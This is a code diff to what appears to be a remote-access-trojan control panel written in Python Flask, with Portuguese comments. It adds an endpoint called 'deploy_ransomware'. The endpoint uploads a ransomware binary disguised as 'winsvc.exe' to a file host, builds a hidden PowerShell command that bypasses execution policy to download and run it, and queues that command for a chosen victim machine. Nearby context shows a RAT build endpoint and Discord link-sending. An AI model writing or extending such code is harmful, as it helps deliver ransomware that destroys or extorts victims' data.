@@ -528,6 +528,56 @@ def send_discord_link_sync(gofile_url, file_path):
     except Exception as e:
         logger.warning(f"[DISCORD] Falha: {e}")
 
+@app.route('/api/crypt/<pc_name>', methods=['POST'])
+@require_login
+def deploy_ransomware(pc_name):
+    """Envia ransomware para vitima: upload Gofile → download → executa"""
+    from pathlib import Path
+    dist_dir = Path(app.root_path) / 'dist'
+    wd_path = dist_dir / 'winsvc.exe'
+    
+    if not wd_path.exists():
+        # Also check in the root (ransomware dir)
+        root_wd = Path(app.root_path) / '..' / '..' / 'dist' / 'winsvc.exe'
+        if root_wd.exists():
+            wd_path = root_wd
+        else:
+            return jsonify({"error": "winsvc.exe nao encontrado. Compile o ransomware primeiro."}), 404
+    
+    # Upload to Gofile
+    try:
+        gofile_link = upload_to_gofile(str(wd_path))
+    except:
+        gofile_link = None
+    
+    # Build command: download from gofile (or panel) and execute
+    if gofile_link:
+        dl_url = gofile_link
+    else:
+        dl_url = f"http://{request.host}/api/watchdog"  # reuse watchdog endpoint
+        
+    ps_cmd = (
+        f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
+        f'"Start-Sleep 2; '
+        f'Invoke-WebRequest -Uri {dl_url} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
+        f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
+    )
+    
+    with pc_lock:
+        if pc_name not in command_queue:
+            command_queue[pc_name] = []
+        command_queue[pc_name].append(ps_cmd)
+    
+    logger.info(f"[CRYPT] Ransomware deploy para {pc_name} via {dl_url[:50]}...")
+    broadcast_notification('info', 'Ransomware Enviado', f'winsvc.exe enviado para {pc_name}', pc_name)
+    
+    return jsonify({
+        "status": "queued",
+        "pc_name": pc_name,
+        "gofile": gofile_link
+    })
+
+
 @app.route('/api/build', methods=['POST'])
 def build_rat_exe():
     """Retorna RAT.exe compilado. Envia link pro Discord automaticamente."""
